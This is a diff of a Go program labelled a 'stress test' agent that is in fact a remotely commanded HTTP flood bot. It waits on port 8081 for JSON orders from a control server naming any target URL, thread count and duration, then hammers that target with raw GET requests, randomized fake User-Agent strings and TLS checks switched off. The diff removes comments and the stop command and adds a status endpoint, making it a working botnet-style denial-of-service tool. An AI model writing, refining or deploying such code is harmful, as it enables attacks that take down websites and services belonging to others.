@@ -1,6 +1,7 @@
 package main
 
 import (
+	"context"
 	"crypto/tls"
 	"encoding/json"
 	"fmt"
@@ -11,45 +12,39 @@ import (
 	"strconv"
 	"sync"
 	"time"
-	"context"
 )
 
-// Command structure for receiving instructions from the control server
 type Command struct {
-	Action  string `json:"action"`  // "start" or "stop"
-	URL     string `json:"url"`     // Target URL
-	Threads int    `json:"threads"` // Number of threads
-	Timer   int    `json:"timer"`   // Duration in seconds
-	Cookie  string `json:"cookie"`  // Cookie for the request (optional)
+	Action  string `json:"action"`
+	URL     string `json:"url"`
+	Threads int    `json:"threads"`
+	Timer   int    `json:"timer"`
+	Cookie  string `json:"cookie"`
 }
 
-// Global variables for stress test configuration
 var (
-	ip      string
-	port    int
-	path    string
-	threads int
-	timer   int
-	cookie  string
-
-	mu         sync.Mutex
+	ip         string
+	port       int
+	path       string
+	threads    int
+	timer      int
+	cookie     string
 	activeTest bool
-)
+	cancelFunc context.CancelFunc
+	mu         sync.Mutex
 
-// Pre-defined user agent parts
-var (
 	choice  = []string{"Macintosh", "Windows", "X11"}
 	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
 	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
 	choice4 = []string{"Linux i686", "Linux x86_64"}
 	choice5 = []string{"chrome", "firefox", "edge", "safari"}
+	choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
 )
 
 func init() {
 	rand.Seed(time.Now().UnixNano())
 }
 
-// Generate a random User-Agent
 func getUserAgent() string {
 	platform := choice[rand.Intn(len(choice))]
 	var os string
@@ -77,7 +72,6 @@ func getUserAgent() string {
 	}
 }
 
-// Generate an HTTP header for the request
 func getHeader() string {
 	header := fmt.Sprintf("GET %s HTTP/1.1\r\n", path)
 	header += fmt.Sprintf("Host: %s\r\n", ip)
@@ -92,27 +86,20 @@ func getHeader() string {
 	return header
 }
 
-// Worker function for sending requests
 func worker(ctx context.Context, id int, wg *sync.WaitGroup, requestCount chan int) {
 	defer wg.Done()
 
+	tlsConfig := &tls.Config{InsecureSkipVerify: true}
 	address := fmt.Sprintf("%s:%d", ip, port)
-
-	tlsConfig := &tls.Config{InsecureSkipVerify: true} // Moved here for HTTPS
 
 	for {
 		select {
-		case <-ctx.Done(): // Stop signal
-			fmt.Printf("Worker %d stopping\n", id)
+		case <-ctx.Done():
 			return
-		case count, ok := <-requestCount:
-			if !ok {
-				return
-			}
+		case count := <-requestCount:
 			var conn net.Conn
 			var err error
 
-			// Use TLS for HTTPS connections
 			if port == 443 {
 				conn, err = tls.Dial("tcp", address, tlsConfig)
 			} else {
@@ -126,8 +113,7 @@ func worker(ctx context.Context, id int, wg *sync.WaitGroup, requestCount chan i
 
 			header := getHeader()
 			for i := 0; i < count; i++ {
-				// Randomized delay
-				time.Sleep(time.Millisecond * time.Duration(rand.Intn(100)))
+				time.Sleep(time.Millisecond * time.Duration(rand.Intn(100))) // Randomized delay
 				_, err := conn.Write([]byte(header))
 				if err != nil {
 					fmt.Printf("Worker %d: write error: %v\n", id, err)
@@ -139,9 +125,7 @@ func worker(ctx context.Context, id int, wg *sync.WaitGroup, requestCount chan i
 	}
 }
 
-// Start the stress test
 func startTest(urlStr string, threads, timer int, cookieStr string) {
-	// Parse URL
 	parsedURL, err := url.Parse(urlStr)
 	if err != nil {
 		fmt.Println("Invalid URL:", err)
@@ -161,23 +145,20 @@ func startTest(urlStr string, threads, timer int, cookieStr string) {
 	if path == "" {
 		path = "/"
 	}
-
 	cookie = cookieStr
 
-	fmt.Printf("Starting stress test on %s:%d%s with %d threads for %d seconds\n", ip, port, path, threads, timer)
+	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timer)*time.Second)
+	cancelFunc = cancel
 
 	var wg sync.WaitGroup
 	requestCount := make(chan int, threads)
-
-	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timer)*time.Second)
-	defer cancel()
 
 	for i := 0; i < threads; i++ {
 		wg.Add(1)
 		go worker(ctx, i, &wg, requestCount)
 	}
 
-	// Dispatch requests
+	// Dispatch requests to workers
 	go func() {
 		ticker := time.NewTicker(1 * time.Second)
 		defer ticker.Stop()
@@ -185,18 +166,19 @@ func startTest(urlStr string, threads, timer int, cookieStr string) {
 		for t := 0; t < timer; t++ {
 			<-ticker.C
 			for i := 0; i < threads; i++ {
-				// Dynamic load: send a random number of requests per second per thread
-				requestCount <- rand.Intn(151) + 50
+				requestCount <- rand.Intn(151) + 50 // Randomized load per thread
 			}
 		}
 		close(requestCount)
 	}()
 
 	wg.Wait()
+	mu.Lock()
+	activeTest = false
+	mu.Unlock()
 	fmt.Println("Stress test completed.")
 }
 
-// HTTP handler to receive control commands
 func controlHandler(w http.ResponseWriter, r *http.Request) {
 	var cmd Command
 	if err := json.NewDecoder(r.Body).Decode(&cmd); err != nil {
@@ -204,32 +186,34 @@ func controlHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	if cmd.Action == "start" && !activeTest {
+		mu.Lock()
+		activeTest = true
+		mu.Unlock()
+
+		go startTest(cmd.URL, cmd.Threads, cmd.Timer, cmd.Cookie)
+		w.Write([]byte("Test started"))
+		return
+	}
+
+	http.Error(w, "Invalid or conflicting command", http.StatusConflict)
+}
+
+func statusHandler(w http.ResponseWriter, r *http.Request) {
 	mu.Lock()
 	defer mu.Unlock()
 
-	if cmd.Action == "start" && !activeTest {
-		activeTest = true
-		go func() {
-			startTest(cmd.URL, cmd.Threads, cmd.Timer, cmd.Cookie)
-			mu.Lock()
-			activeTest = false
-			mu.Unlock()
-		}()
-		w.Write([]byte("Stress test started"))
-	} else if cmd.Action == "stop" && activeTest {
-		activeTest = false
-		// No native way to stop a goroutine, but we rely on the test completing
-		w.Write([]byte("Stress test stopped"))
-	} else {
-		w.Write([]byte("Invalid or conflicting command"))
+	status := "Ready"
+	if activeTest {
+		status = "Sending"
 	}
+
+	json.NewEncoder(w).Encode(map[string]string{"status": status})
 }
 
 func main() {
 	http.HandleFunc("/control", controlHandler)
-	fmt.Println("Agent server is running on port 8081")
-	err := http.ListenAndServe(":8081", nil)
-	if err != nil {
-		fmt.Printf("Server error: %v\n", err)
-	}
+	http.HandleFunc("/status", statusHandler)
+	fmt.Println("Agent is running on port 8081")
+	http.ListenAndServe(":8081", nil)
 }
